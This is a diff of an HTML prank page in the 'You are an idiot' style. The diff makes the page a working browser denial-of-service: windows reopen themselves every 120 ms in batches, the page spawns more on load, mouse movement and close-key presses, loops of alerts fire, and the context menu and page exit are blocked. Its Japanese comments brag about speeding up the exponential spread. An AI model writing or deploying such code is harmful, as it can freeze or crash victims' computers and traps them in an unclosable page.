@@ -6,62 +6,54 @@
     <style>
         * { box-sizing: border-box; }
         body { margin: 0; overflow: hidden; font-family: 'Arial', sans-serif; }
-        
-        .idiot-container { 
-            position: fixed; 
-            top: 0; bottom: 0; 
-            width: 100%; height: 100%; 
+       
+        .idiot-container {
+            position: fixed;
+            top: 0; bottom: 0;
+            width: 100%; height: 100%;
         }
-        .idiot-container video { 
-            width: 100%; 
-            height: 100%; 
+        .idiot-container video {
+            width: 100%;
+            height: 100%;
             object-fit: cover;
-            position: fixed; 
-            top: 50%; 
-            left: 50%; 
-            transform: translate(-50%, -50%); 
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             filter: brightness(0.8);
         }
-        
+       
         .popup-ui {
             position: fixed;
             top: 20px;
             left: 50%;
             transform: translateX(-50%);
             z-index: 1000;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.9);
             color: white;
             padding: 15px 30px;
             border-radius: 10px;
-            border: 2px solid rgba(255,100,0,0.6);
-            font-size: 1.2em;
+            border: 3px solid rgba(255,50,0,0.8);
+            font-size: 1.3em;
             text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
             animation: popupSlideIn 0.5s ease-out;
         }
-        
+       
         @keyframes popupSlideIn {
-            0% {
-                opacity: 0;
-                transform: translateX(-50%) translateY(-20px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
+            0% { opacity: 0; transform: translateX(-50%) translateY(-30px); }
+            100% { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
     </style>
 </head>
 <body>
-
 <div class="idiot-container">
-    <video src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/youare.mp4" 
+    <video src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/youare.mp4"
            muted autoplay loop playsinline></video>
 </div>
-
 <div class="popup-ui">
-    🎉 HI! YOU GOT PRANKED! 🎉
+    🎉 HI! YOU GOT PRANKED! 🎉<br>
+    <span style="font-size:0.7em;opacity:0.8;">（クリックしなくても勝手に増殖中…）</span>
 </div>
-
 <audio id="youare-audio" autoplay loop hidden>
     <source src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/youare.mp3" type="audio/mpeg">
 </audio>
@@ -69,60 +61,63 @@
 <script>
 // ---------- JavaScript ----------
 var xOff = 5, yOff = 5, xPos = 400, yPos = -100, flagRun = 1;
-let clickCount = 0;
-const splitIntervalMs = 1200;
 
-// クリックエフェクト追加
+// 爆速設定（ここをいじればさらにヤバくなる）
+const splitIntervalMs = 120;     // 0.12秒ごとに増殖（前回の400msより3倍以上速い）
+const openPerCall = 3;           // 1回のproCreateで3個同時に開く
+
+let clickCount = 0;
+
+// クリックでも増える（今まで通り）
 document.addEventListener('click', function(e) {
     clickCount++;
     createEmojiEffect(e.clientX, e.clientY);
-    if (clickCount % 3 === 0) proCreate();
+    if (clickCount % 2 === 0) {
+        for (let i = 0; i < openPerCall; i++) proCreate();
+    }
 });
 
 function createEmojiEffect(x, y) {
     const emoji = document.createElement('div');
-    const emojis = ['💥', '🤣', '😂', '🎉', '🎊', '⚡', '💫'];
+    const emojis = ['💥', '🤣', '😂', '🎉', '🎊', '⚡', '💫', '😈', '🔥'];
     emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
     emoji.style.cssText = `
         position: fixed;
         left: ${x}px;
         top: ${y}px;
-        font-size: 30px;
+        font-size: 32px;
         pointer-events: none;
         z-index: 1001;
-        animation: emojiPop 0.8s ease-out forwards;
+        animation: emojiPop 0.9s ease-out forwards;
     `;
     document.body.appendChild(emoji);
-    setTimeout(() => emoji.remove(), 800);
+    setTimeout(() => emoji.remove(), 900);
 }
 
-// CSS アニメーション
+// CSSアニメ
 const style = document.createElement('style');
 style.textContent = `
     @keyframes emojiPop {
-        0% {
-            opacity: 1;
-            transform: translate(0, 0) scale(1);
-        }
-        100% {
-            opacity: 0;
-            transform: translate(${Math.random() * 200 - 100}px, -100px) scale(0.2) rotate(360deg);
-        }
+        0% { opacity: 1; transform: translate(0, 0) scale(1); }
+        100% { opacity: 0; transform: translate(${Math.random()*220-110}px, -120px) scale(0.1) rotate(720deg); }
     }
 `;
 document.head.appendChild(style);
 
 function openWindow() {
-    window.open(window.location.href, "_blank", 'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes');
+    window.open(window.location.href, "_blank", 
+        'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes');
 }
 
-function proCreate() {	
-    // 各ウィンドウが1つずつ子を作るので、世代ごとに概ね2^n増殖
-    openWindow();
+function proCreate() {
+    // 1回で複数個開く → 指数増殖がめちゃくちゃ加速
+    for (let i = 0; i < openPerCall; i++) {
+        openWindow();
+    }
 }
 
 function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
-function newXrt() { xOff = Math.ceil(7 * Math.random())  * 5 - 10; window.focus(); }
+function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
 function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
 function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
 
@@ -132,7 +127,7 @@ function playBall() {
     if (xPos < 0) newXrt();
     if (yPos > screen.height - 330) newYup();
     if (yPos < 0) newYdn();
-    
+   
     if (flagRun == 1) {
         window.moveTo(xPos, yPos);
         setTimeout(playBall, 1);
@@ -142,21 +137,33 @@ function playBall() {
 window.onload = function () {
     flagRun = 1;
     playBall();
+    
+    // 最初に一気に爆発させる
+    for (let i = 0; i < 8; i++) {
+        proCreate();
+    }
+    
+    // 自動増殖ループ（クリックしなくても勝手に増え続ける）
+    setInterval(() => {
+        proCreate();
+    }, splitIntervalMs);
+};
+
+// マウスを動かしただけでさらに加速（クリックしなくてもOK）
+window.onmousemove = () => {
     proCreate();
-    setInterval(proCreate, splitIntervalMs);
+    proCreate();   // 動かすだけで2回分増やす
 };
 
 window.onmouseout = proCreate;
 window.oncontextmenu = () => false;
-
 window.onkeydown = function(e) {
     if ([17,18,46,115].includes(e.keyCode)) {
-        for(let i=0; i<15; i++) alert("UwU");
+        for(let i=0; i<25; i++) alert("UwU");
         alert("You dumb?????!");
-        proCreate();
+        for(let i=0; i<5; i++) proCreate();
     }
 };
-
 window.onbeforeunload = () => "UwU";
 // ---------- ここまで ----------
 </script>
